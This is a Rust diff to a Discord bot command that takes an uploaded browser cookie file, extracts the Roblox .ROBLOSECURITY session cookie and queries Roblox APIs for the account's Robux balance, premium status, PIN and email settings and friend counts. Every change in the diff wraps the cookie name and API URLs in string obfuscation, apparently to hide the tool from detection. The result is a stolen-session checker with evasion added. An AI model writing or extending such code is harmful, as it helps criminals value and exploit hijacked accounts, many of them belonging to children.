@@ -151,7 +151,7 @@ impl BotCommand for RobloxCommand {
             Some(cookie) => cookie,
             None => {
                 http.create_message(msg.channel_id)
-                    .content("Could not find `.ROBLOSECURITY` cookie in the file\n\nSupported formats:\n• JSON (from browser extension)\n• Netscape (cookies.txt)")
+                    .content(&format!("Could not find `{}` cookie in the file\n\nSupported formats:\n• JSON (from browser extension)\n• Netscape (cookies.txt)", obfstr::obfstr!(".ROBLOSECURITY")))
                     .await?;
                 return Ok(());
             }
@@ -204,7 +204,7 @@ impl RobloxCommand {
             return self.parse_json_cookies(content);
         }
         
-        if content.contains(".roblox.com") || filename.ends_with(".txt") {
+        if content.contains(obfstr::obfstr!(".roblox.com")) || filename.ends_with(".txt") {
             return self.parse_netscape_cookies(content);
         }
         
@@ -218,20 +218,20 @@ impl RobloxCommand {
     fn parse_json_cookies(&self, content: &str) -> Option<String> {
         if let Ok(cookies) = serde_json::from_str::<Vec<JsonCookie>>(content) {
             for cookie in cookies {
-                if cookie.name == ".ROBLOSECURITY" {
+                if cookie.name == obfstr::obfstr!(".ROBLOSECURITY") {
                     return Some(cookie.value);
                 }
             }
         }
         
         if let Ok(cookie) = serde_json::from_str::<JsonCookie>(content) {
-            if cookie.name == ".ROBLOSECURITY" {
+            if cookie.name == obfstr::obfstr!(".ROBLOSECURITY") {
                 return Some(cookie.value);
             }
         }
         
-        if content.contains(".ROBLOSECURITY") {
-            if let Some(start) = content.find("_|WARNING:-DO-NOT-SHARE-THIS") {
+        if content.contains(obfstr::obfstr!(".ROBLOSECURITY")) {
+            if let Some(start) = content.find(obfstr::obfstr!("_|WARNING:-DO-NOT-SHARE-THIS")) {
                 let remaining = &content[start..];
                 if let Some(end) = remaining.find('"') {
                     return Some(remaining[..end].to_string());
@@ -263,7 +263,7 @@ impl RobloxCommand {
                 let name = parts[5];
                 let value = parts[6];
                 
-                if name == ".ROBLOSECURITY" {
+                if name == obfstr::obfstr!(".ROBLOSECURITY") {
                     return Some(value.to_string());
                 }
             }
@@ -273,7 +273,7 @@ impl RobloxCommand {
                 let name = parts[5];
                 let value = parts[6];
                 
-                if name == ".ROBLOSECURITY" {
+                if name == obfstr::obfstr!(".ROBLOSECURITY") {
                     return Some(value.to_string());
                 }
             }
@@ -287,9 +287,9 @@ impl RobloxCommand {
             .cookie_store(true)
             .build()?;
 
-        let cookie_header = format!(".ROBLOSECURITY={}", cookie);
+        let cookie_header = format!("{}={}", obfstr::obfstr!(".ROBLOSECURITY"), cookie);
         let auth_user: AuthenticatedUser = client
-            .get("https://users.roblox.com/v1/users/authenticated")
+            .get(obfstr::obfstr!("https://users.roblox.com/v1/users/authenticated"))
             .header("Cookie", &cookie_header)
             .send()
             .await?
@@ -299,7 +299,7 @@ impl RobloxCommand {
         let user_id = auth_user.id;
 
         let user_info: UserInfo = client
-            .get(&format!("https://users.roblox.com/v1/users/{}", user_id))
+            .get(&format!("{}{}" , obfstr::obfstr!("https://users.roblox.com/v1/users/"), user_id))
             .header("Cookie", &cookie_header)
             .send()
             .await?
@@ -307,7 +307,7 @@ impl RobloxCommand {
             .await?;
 
         let currency: CurrencyResponse = client
-            .get("https://economy.roblox.com/v1/user/currency")
+            .get(obfstr::obfstr!("https://economy.roblox.com/v1/user/currency"))
             .header("Cookie", &cookie_header)
             .send()
             .await?
@@ -316,7 +316,7 @@ impl RobloxCommand {
             .unwrap_or(CurrencyResponse { robux: 0 });
 
         let friends: CountResponse = client
-            .get("https://friends.roblox.com/v1/my/friends/count")
+            .get(obfstr::obfstr!("https://friends.roblox.com/v1/my/friends/count"))
             .header("Cookie", &cookie_header)
             .send()
             .await?
@@ -325,7 +325,7 @@ impl RobloxCommand {
             .unwrap_or(CountResponse { count: 0 });
 
         let followers: CountResponse = client
-            .get("https://friends.roblox.com/v1/my/followers/count")
+            .get(obfstr::obfstr!("https://friends.roblox.com/v1/my/followers/count"))
             .header("Cookie", &cookie_header)
             .send()
             .await?
@@ -334,7 +334,7 @@ impl RobloxCommand {
             .unwrap_or(CountResponse { count: 0 });
 
         let following: CountResponse = client
-            .get("https://friends.roblox.com/v1/my/followings/count")
+            .get(obfstr::obfstr!("https://friends.roblox.com/v1/my/followings/count"))
             .header("Cookie", &cookie_header)
             .send()
             .await?
@@ -343,7 +343,7 @@ impl RobloxCommand {
             .unwrap_or(CountResponse { count: 0 });
 
         let premium_resp = client
-            .get(&format!("https://premiumfeatures.roblox.com/v1/users/{}/validate-membership", user_id))
+            .get(&format!("{}{}{}" , obfstr::obfstr!("https://premiumfeatures.roblox.com/v1/users/"), user_id, obfstr::obfstr!("/validate-membership")))
             .header("Cookie", &cookie_header)
             .send()
             .await;
@@ -353,7 +353,7 @@ impl RobloxCommand {
             .unwrap_or(false);
 
         let thumbnail: Option<String> = match client
-            .get(&format!("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={}&size=420x420&format=Png&isCircular=false", user_id))
+            .get(&format!("{}{}{}" , obfstr::obfstr!("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="), user_id, obfstr::obfstr!("&size=420x420&format=Png&isCircular=false")))
             .send()
             .await
         {
@@ -367,7 +367,7 @@ impl RobloxCommand {
         };
 
         let pin_enabled = match client
-            .get("https://apis.roblox.com/account-pin/v1/status")
+            .get(obfstr::obfstr!("https://apis.roblox.com/account-pin/v1/status"))
             .header("Cookie", &cookie_header)
             .send()
             .await
@@ -382,7 +382,7 @@ impl RobloxCommand {
         };
 
         let email_verified = match client
-            .get("https://accountsettings.roblox.com/v1/email")
+            .get(obfstr::obfstr!("https://accountsettings.roblox.com/v1/email"))
             .header("Cookie", &cookie_header)
             .send()
             .await
@@ -517,7 +517,7 @@ impl RobloxCommand {
 
         embed = embed.field(EmbedField {
             name: "Profile".to_string(),
-            value: format!("[View on Roblox](https://www.roblox.com/users/{}/profile)", info.user_id),
+            value: format!("[View on Roblox]({}{}{})", obfstr::obfstr!("https://www.roblox.com/users/"), info.user_id, obfstr::obfstr!("/profile")),
             inline: false,
         });
 
